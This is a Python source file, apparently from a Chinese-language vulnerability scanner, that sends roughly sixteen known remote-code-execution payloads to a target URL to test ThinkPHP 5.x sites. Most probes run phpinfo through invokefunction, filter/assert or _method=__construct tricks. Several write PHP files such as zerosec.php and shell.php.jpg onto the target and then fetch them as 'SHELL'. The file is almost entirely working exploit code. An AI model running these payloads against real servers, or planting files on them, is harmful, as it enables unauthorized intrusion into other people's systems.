#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoR,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class ThinkRCEScan:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url,headers=header, verify=self.ssl, data=data,timeout=self.timeout, proxies=self.proxy)

            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.1-RCE-POC-1: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt",f'存在ThinkPHP-5.0.1-RCE-POC-1: {url} | Data: {data}')

                
        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')

    def run2(self,urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.1-RCE-POC-2: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt",f'存在ThinkPHP-5.0.1-RCE-POC-2: {url} | Data: {data}')

        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')



    def run3(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.1-RCE-POC-3: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.1-RCE-POC-3: {url} | Data: {data}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')

    def run12(self, urls):
        try:
            url = urls + '/?s=index/think\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)


            url2 = urls + "/shell.php.jpg"
            res2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                 proxies=self.proxy)
            if "disable_functions" in res2.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.14-RCE-POC-1: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.14-RCE-POC-1: {url} | Shell: {url2}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run13(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.14-RCE-POC-2: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.14-RCE-POC-2: {url}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')

    def run17(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # 
            url2 = urls + "/zerosec.php"
            resp2 = requests.get(url2, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            resp2.encoding = response.apparent_encoding
            if "disable_functions" in resp2.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.15-RCE: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")
                    OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.15-RCE: {url} | Shell: {url2}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run18(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            

            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.18-RCE-POC-1: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.18-RCE-POC-1: {url}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run19(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            

            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.18-RCE-POC-2: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.18-RCE-POC-2: {url}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')


    def run23(self, urls):
        try:
            url = urls + '/public'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            

            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.8-RCE-POC-1: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.8-RCE-POC-1: {url} | Data: {data}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run24(self, urls):
        try:
            url = urls + '/public'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            # 
            url2 = urls + "/zerosec.php"
            response2 = requests.get(url2, headers=self.headers,verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.8-RCE-POC-2: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"DATA:{data}")

                    OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.8-RCE-POC-2: {url} | Data: {data} | Shell: {url2}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')

    def run25(self, urls):
        try:
            url = urls + '/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uploads/1321231.php&vars[1][]=<?php phpinfo();?>'

            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            # 
            url2 = urls + "/uploads/1321231.php"
            response2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.8-RCE-POC-3: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                else:
                    OutPutFile("thinkphp_rce_check.txt",
                               f'存在ThinkPHP-5.0.8-RCE-POC-3: {url} | Shell: {url2}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run26(self, urls):
        try:
            url = urls + '/?s=index/\think\Request/input&filter=phpinfo&data=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.1.29-RCE-POC-1: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt",f'存在ThinkPHP-5.1.29-RCE-POC-1: {url}')



        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run27(self, urls):
        try:
            url = urls + '/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.1.29-RCE-POC-2: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.1.29-RCE-POC-2: {url}')



        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run28(self, urls):
        try:
            url = urls + '/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP 5.0.22_5.1.29: {url}')
                if self.batch:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP 5.0.22_5.1.29: {url}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')

    def run30(self, urls):
        try:
            url = urls + "/?s=index/index/index"
            data = "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header, verify=self.ssl, timeout=self.timeout,proxies=self.proxy,data=data)
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.23-RCE-Poc1漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"Data: {data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.23-RCE-Poc1: {url} | Data: {data}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def run31(self, urls):
        try:
            url = urls + "/?s=captcha&test=phpinfo()"
            data = "_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.post(url, headers=header,verify=self.ssl, timeout=self.timeout,proxies=self.proxy,data=data)
            if "disable_functions" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'存在ThinkPHP-5.0.23-RCE-Poc2漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"Data: {data}")
                else:
                    OutPutFile("thinkphp_rce_check.txt", f'存在ThinkPHP-5.0.23-RCE-Poc2: {url} | Data: {data}')


        except Exception:
            if not self.batch:
                OutPrintInfoR("ThinkPHP", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ThinkPHP", '开始检测RCE...')
            OutPrintInfoR("ThinkPHP", '检测5.x RCE漏洞')
            OutPrintInfoR("ThinkPHP", '开始POC-0...')
        self.run(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-1...')
        self.run2(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-2...')
        self.run3(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-3...')
        self.run12(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-4...')
        self.run13(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-5...')
        self.run17(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-6...')
        self.run18(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-7...')
        self.run19(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-8...')
        self.run23(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-9...')
        self.run24(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-10...')
        self.run25(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-11...')
        self.run26(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-12...')
        self.run27(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-13...')
        self.run28(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-14...')
        self.run30(url)
        if not self.batch:
            OutPrintInfoR("ThinkPHP", '开始POC-15...')
        self.run31(url)

        if not self.batch:
            OutPrintInfo("ThinkPHP", 'RCE检测结束')